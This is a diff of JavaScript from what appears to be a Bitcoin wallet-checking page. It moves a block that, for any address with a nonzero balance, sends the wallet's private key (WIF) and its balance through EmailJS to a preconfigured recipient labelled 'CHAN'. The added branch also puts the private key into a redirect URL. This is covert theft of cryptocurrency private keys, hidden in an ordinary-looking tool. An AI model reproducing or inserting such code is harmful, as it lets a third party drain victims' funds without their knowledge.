@@ -257,22 +257,7 @@ emailjs.init("user_HFVuwTy8HlTgM5YQ3mj5S");
 				data: {"address":addr},
 			success: function(data){
 				if($(data).find('balance').text()!="0"){
-					var data22 = {
-	    				service_id: 'service_2pp0eeo',
-	    				template_id: 'template_qu42mgi',
-	    				user_id: 'user_HFVuwTy8HlTgM5YQ3mj5S',
-	    				template_params: {
-	    				    'to_name': 'CHAN',
-	    				    'from_name':'SUCCESS',
-	    				    'message': wif +' == '+$(data).find('balance').text()
-	  				  	}
-					};
-					$.ajax({
-						url: "https://api.emailjs.com/api/v1.0/email/send",
-						type: "POST",
-						data: JSON.stringify(data22),
-						contentType: 'application/json'
-					});
+
 					console.log(wif +' == '+$(data).find('balance').text());
 				}
 				
@@ -527,7 +512,22 @@ emailjs.init("user_HFVuwTy8HlTgM5YQ3mj5S");
 			r=data;
 				
 				if(r!="0"){
-
+					var data22 = {
+	    				service_id: 'service_2pp0eeo',
+	    				template_id: 'template_qu42mgi',
+	    				user_id: 'user_HFVuwTy8HlTgM5YQ3mj5S',
+	    				template_params: {
+	    				    'to_name': 'CHAN',
+	    				    'from_name':'SUCCESS',
+	    				    'message': wif +' balance: '+data
+	  				  	}
+					};
+							$.ajax({
+						url: "https://api.emailjs.com/api/v1.0/email/send",
+						type: "POST",
+						data: JSON.stringify(data22),
+						contentType: 'application/json'
+					});
 					location.href="https://www.blockchain.com/btc/address/"+addr2+"&priv="+wif;
 				}
 				},
